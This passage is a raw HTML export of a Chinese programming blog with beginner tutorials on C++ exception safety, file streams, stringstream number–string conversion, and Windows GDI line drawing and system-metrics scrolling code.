class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">double</span> a, b, c, res;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入三角形边长：&quot;</span>;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">res = <span class="built_in">area</span>(a, b, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span> (invalid_argument&amp; e)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;三角形的面积为：&quot;</span> &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写异常安全程序的原则"><a href="#编写异常安全程序的原则" class="headerlink" title="编写异常安全程序的原则"></a>编写异常安全程序的原则</h2><ul><li><p>明确哪些操作绝对不会抛掷异常：</p><ol><li>基本数据类型的绝大部分操作</li><li>指针的赋值</li><li>算数运算和比较运算</li><li><code>STL</code>容器的<code>swap</code>函数</li></ol></li><li><p>尽量确保析构函数不抛掷异常，如果必须抛掷，须在<strong>抛掷异常前</strong>完成资源释放</p></li></ul><h2 id="避免异常引发的资源泄露"><a href="#避免异常引发的资源泄露" class="headerlink" title="避免异常引发的资源泄露"></a>避免异常引发的资源泄露</h2><h3 id="常见问题-1"><a href="#常见问题-1" class="headerlink" title="常见问题"></a>常见问题</h3><ul><li>函数在抛出异常以前没有释放应该<strong>由它负责</strong>释放的资源(例如用<code>new</code>分配的变量是不可以自动析构的，必须使用<code>free</code>)</li></ul><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><ul><li>把一切动态分配的资源都包装成栈上的对象，利用抛掷异常时自动调用对象析构函数的特性来释放资源</li><li>对于必须在堆上构造的对象，可以用智能指针<code>auto_ptr</code>加以包装</li></ul>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++文件流操作</title>
      <link href="/post/50f93117.html"/>
      <url>/post/50f93117.html</url>
      
        <content type="html"><![CDATA[<h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="open-函数"><a href="#open-函数" class="headerlink" title="open()函数"></a>open()函数</h2><p><code>open()</code> 成员函数用于打开文件</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, ios::openmode mode)</span></span>;</span><br><span class="line"><span class="comment">// 第一参数指定要打开的文件的名称和位置(直接写文件名表示是在与cpp同级文件夹操作)，第二个参数定义文件被打开的模式</span></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:left">模式标志</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">ios::app</td><td style="text-align:left">追加模式。所有写入都追加到文件末尾。</td></tr><tr><td style="text-align:left">ios::ate</td><td style="text-align:left">文件打开后定位到文件末尾。</td></tr><tr><td style="text-align:left">ios::in</td><td style="text-align:left">打开文件用于读取。</td></tr><tr><td style="text-align:left">ios::out</td><td style="text-align:left">打开文件用于写入。</td></tr><tr><td style="text-align:left">ios::trunc</td><td style="text-align:left">如果该文件已经存在，其内容将在打开文件之前被截断，即把文件长度设为 0。</td></tr></tbody></table></div><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string name, school;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="function">ofstream <span class="title">fout</span><span class="params">(<span class="string">&quot;test.txt&quot;</span>, ios::out | ios::trunc)</span></span>;<span class="comment">// 定义文件输出对象并绑定文件名；ios::out表示向文件输出，ios::trunc表示直接覆盖文件内容，即下一次文件写入会先清空原文件内容再写入</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;姓名: &quot;</span>;</span><br><span class="line">cin &gt;&gt; name;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;年龄: &quot;</span>;</span><br><span class="line">cin &gt;&gt; age;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;学校: &quot;</span>;</span><br><span class="line">cin &gt;&gt; school;</span><br><span class="line">fout &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">fout &lt;&lt; age &lt;&lt; endl;</span><br><span class="line">fout &lt;&lt; school &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;信息已写入文件!&quot;</span> &lt;&lt; endl;</span><br><span class="line">fout.<span class="built_in">close</span>();<span class="comment">// 要记得关闭文件对象</span></span><br><span class="line"></span><br><span class="line">ifstream fin;<span class="comment">// 定义文件输入对象</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\n读取文件...&quot;</span> &lt;&lt; endl;</span><br><span class="line">fin.<span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, ios::in);<span class="comment">// 以读取方式打开文件test.txt</span></span><br><span class="line">fin &gt;&gt; name;</span><br><span class="line">fin &gt;&gt; age;</span><br><span class="line">fin &gt;&gt; school;</span><br><span class="line">fin.<span class="built_in">close</span>();<span class="comment">// 要记得关闭文件对象</span></span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;文件内容如下：&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;姓名: &quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;年龄: &quot;</span> &lt;&lt; age &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;学校：&quot;</span> &lt;&lt; school &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 文件流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++文件流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流操作实现字符串与数字相互转换</title>
      <link href="/post/7fa1f186.html"/>
      <url>/post/7fa1f186.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>c++课学到的，超级实用~支持各种类型的数字与字符串之间的转换，下面以<code>int</code>和<code>double</code>类型举例</p><h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="模板函数"><a href="#模板函数" class="headerlink" title="模板函数"></a>模板函数</h2><p><code>数字-&gt;字符串</code>的模板函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> string <span class="title">toString</span><span class="params">(T data)</span><span class="comment">// inline: 内联函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ostringstream os;<span class="comment">// 定义字符串输出流对象存储数字</span></span><br><span class="line">os &lt;&lt; data;</span><br><span class="line"><span class="keyword">return</span> os.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>字符串-&gt;数字</code>的模板函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> T <span class="title">toNum</span><span class="params">(<span class="type">const</span> string str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">T data;</span><br><span class="line"><span class="function">istringstream <span class="title">is</span><span class="params">(str)</span></span>;<span class="comment">// 定义字符串输入流对象并存入字符串</span></span><br><span class="line">is &gt;&gt; data;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> string <span class="title">toString</span><span class="params">(T data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ostringstream os;</span><br><span class="line">os &lt;&lt; data;</span><br><span class="line"><span class="keyword">return</span> os.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> T <span class="title">toNum</span><span class="params">(<span class="type">const</span> string str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">T data;</span><br><span class="line"><span class="function">istringstream <span class="title">is</span><span class="params">(str)</span></span>;</span><br><span class="line">is &gt;&gt; data;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string str, str_;</span><br><span class="line"><span class="type">double</span> n;</span><br><span class="line"><span class="type">int</span> m;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入一个数字：&quot;</span>;</span><br><span class="line">cin &gt;&gt; str;</span><br><span class="line">    </span><br><span class="line">cout &lt;&lt; <span class="string">&quot;现在是字符串类型的我：&quot;</span> &lt;&lt; str &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">toNum</span>&lt;<span class="type">double</span>&gt;(str);<span class="comment">// 注意使用尖括号标明模板类型</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;现在是double类型的我：&quot;</span> &lt;&lt; n &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">toNum</span>&lt;<span class="type">int</span>&gt;(str);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;现在是int类型的我：&quot;</span> &lt;&lt; m &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">str_ = <span class="built_in">toString</span>(n);<span class="comment">// 数据传入后会自动判断数据类型所以不需要使用尖括号标注</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;现在又是字符串类型的我：&quot;</span> &lt;&lt; str_ &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    str_ = <span class="built_in">toString</span>(m);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;现在还是字符串类型的我：&quot;</span> &lt;&lt; str_ &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><details class="folding-tag" ><summary> 测试结果 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/06/pCPrRRf.png" alt=""></p>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++实用技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绘制直线</title>
      <link href="/post/8c0af77f.html"/>
      <url>/post/8c0af77f.html</url>
      
        <content type="html"><![CDATA[<h3 id="涉及函数-后续在函数板块补充-："><a href="#涉及函数-后续在函数板块补充-：" class="headerlink" title="涉及函数(后续在函数板块补充)："></a>涉及函数(后续在函数板块补充)：</h3><ol><li>SetPixel</li><li>MoveToEx</li><li>LineTo</li><li>GetCurrentPositionEx</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">HDC hdc;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">RECT rect;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line">POINT current_pos;</span><br><span class="line">TCHAR szBuffer[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">GetClientRect(hwnd, &amp;rect);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*第一种：靠循环在每个点位画点</span></span><br><span class="line"><span class="comment">for (i = rect.left; i &lt; rect.right; ++i)</span></span><br><span class="line"><span class="comment">SetPixel(hdc, i, 100, RGB(255, 0, 0));*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*第二种：使用API函数 </span></span><br><span class="line"><span class="comment">MoveToEx(hdc, 100, 100, NULL);</span></span><br><span class="line"><span class="comment">LineTo(hdc, 600, 100);</span></span><br><span class="line"><span class="comment">GetCurrentPositionEx(hdc, &amp;current_pos);// 获取当前绘点位置</span></span><br><span class="line"><span class="comment">StringCchPrintf(szBuffer, 128, TEXT(&quot;当前绘点位置为: (%d, %d)&quot;), current_pos.x, current_pos.y);</span></span><br><span class="line"><span class="comment">DrawText(hdc, szBuffer, -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 利用API函数设计网格</span></span><br><span class="line"><span class="comment">// 画横线</span></span><br><span class="line"><span class="comment">for (i = 0; i &lt;= rect.bottom; i += 50)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">MoveToEx(hdc, rect.left, i, NULL);</span></span><br><span class="line"><span class="comment">LineTo(hdc, rect.right, i);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">// 画竖线</span></span><br><span class="line"><span class="comment">for (j = 0; j &lt;= rect.right; j += 50)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">MoveToEx(hdc, j, rect.top, NULL);</span></span><br><span class="line"><span class="comment">LineTo(hdc, j, rect.bottom);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 画五角星, emm有点丑陋</span></span><br><span class="line">MoveToEx(hdc, <span class="number">300</span>, <span class="number">100</span>, <span class="literal">NULL</span>);</span><br><span class="line">LineTo(hdc, <span class="number">200</span>, <span class="number">500</span>);</span><br><span class="line">LineTo(hdc, <span class="number">500</span>, <span class="number">200</span>);</span><br><span class="line">LineTo(hdc, <span class="number">100</span>, <span class="number">200</span>);</span><br><span class="line">LineTo(hdc, <span class="number">400</span>, <span class="number">500</span>);</span><br><span class="line">LineTo(hdc, <span class="number">300</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">PostQuitMessage(<span class="number">0</span>); <span class="comment">// 正式关闭窗口</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WinSDK </category>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinSDK程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现滚动条</title>
      <link href="/post/60dff905.html"/>
      <url>/post/60dff905.html</url>
      
        <content type="html"><![CDATA[<h2 id="头文件：sysmets-h"><a href="#头文件：sysmets-h" class="headerlink" title="头文件：sysmets.h"></a>头文件：sysmets.h</h2><p>作用：存储打印信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-----------------------------------------------</span></span><br><span class="line"><span class="comment">   SYSMETS.H -- System metrics display structure</span></span><br><span class="line"><span class="comment">  -----------------------------------------------*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMLINES ((int) (sizeof sysmetrics / sizeof sysmetrics [0]))</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">     <span class="type">int</span>     iIndex ;</span><br><span class="line">     TCHAR * szLabel ;</span><br><span class="line">     TCHAR * szDesc ;</span><br><span class="line">&#125;</span><br><span class="line">sysmetrics [] =</span><br><span class="line">&#123;</span><br><span class="line">     SM_CXSCREEN,             TEXT (<span class="string">&quot;SM_CXSCREEN&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Screen width in pixels&quot;</span>),</span><br><span class="line">     SM_CYSCREEN,             TEXT (<span class="string">&quot;SM_CYSCREEN&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Screen height in pixels&quot;</span>),</span><br><span class="line">     SM_CXVSCROLL,            TEXT (<span class="string">&quot;SM_CXVSCROLL&quot;</span>),             </span><br><span class="line">                              TEXT (<span class="string">&quot;Vertical scroll width&quot;</span>),</span><br><span class="line">     SM_CYHSCROLL,            TEXT (<span class="string">&quot;SM_CYHSCROLL&quot;</span>),             </span><br><span class="line">                              TEXT (<span class="string">&quot;Horizontal scroll height&quot;</span>),</span><br><span class="line">     SM_CYCAPTION,            TEXT (<span class="string">&quot;SM_CYCAPTION&quot;</span>),             </span><br><span class="line">                              TEXT (<span class="string">&quot;Caption bar height&quot;</span>),</span><br><span class="line">     SM_CXBORDER,             TEXT (<span class="string">&quot;SM_CXBORDER&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Window border width&quot;</span>),</span><br><span class="line">     SM_CYBORDER,             TEXT (<span class="string">&quot;SM_CYBORDER&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Window border height&quot;</span>),</span><br><span class="line">     SM_CXFIXEDFRAME,         TEXT (<span class="string">&quot;SM_CXFIXEDFRAME&quot;</span>),          </span><br><span class="line">                              TEXT (<span class="string">&quot;Dialog window frame width&quot;</span>),</span><br><span class="line">     SM_CYFIXEDFRAME,         TEXT (<span class="string">&quot;SM_CYFIXEDFRAME&quot;</span>),          </span><br><span class="line">                              TEXT (<span class="string">&quot;Dialog window frame height&quot;</span>),</span><br><span class="line">     SM_CYVTHUMB,             TEXT (<span class="string">&quot;SM_CYVTHUMB&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Vertical scroll thumb height&quot;</span>),</span><br><span class="line">     SM_CXHTHUMB,             TEXT (<span class="string">&quot;SM_CXHTHUMB&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Horizontal scroll thumb width&quot;</span>),</span><br><span class="line">     SM_CXICON,               TEXT (<span class="string">&quot;SM_CXICON&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;Icon width&quot;</span>),</span><br><span class="line">     SM_CYICON,               TEXT (<span class="string">&quot;SM_CYICON&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;Icon height&quot;</span>),</span><br><span class="line">     SM_CXCURSOR,             TEXT (<span class="string">&quot;SM_CXCURSOR&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Cursor width&quot;</span>),</span><br><span class="line">     SM_CYCURSOR,             TEXT (<span class="string">&quot;SM_CYCURSOR&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Cursor height&quot;</span>),</span><br><span class="line">     SM_CYMENU,               TEXT (<span class="string">&quot;SM_CYMENU&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;Menu bar height&quot;</span>),</span><br><span class="line">     SM_CXFULLSCREEN,         TEXT (<span class="string">&quot;SM_CXFULLSCREEN&quot;</span>),          </span><br><span class="line">                              TEXT (<span class="string">&quot;Full screen client area width&quot;</span>),</span><br><span class="line">     SM_CYFULLSCREEN,         TEXT (<span class="string">&quot;SM_CYFULLSCREEN&quot;</span>),          </span><br><span class="line">                              TEXT (<span class="string">&quot;Full screen client area height&quot;</span>),</span><br><span class="line">     SM_CYKANJIWINDOW,        TEXT (<span class="string">&quot;SM_CYKANJIWINDOW&quot;</span>),         </span><br><span class="line">                              TEXT (<span class="string">&quot;Kanji window height&quot;</span>),</span><br><span class="line">     SM_MOUSEPRESENT,         TEXT (<span class="string">&quot;SM_MOUSEPRESENT&quot;</span>),          </span><br><span class="line">         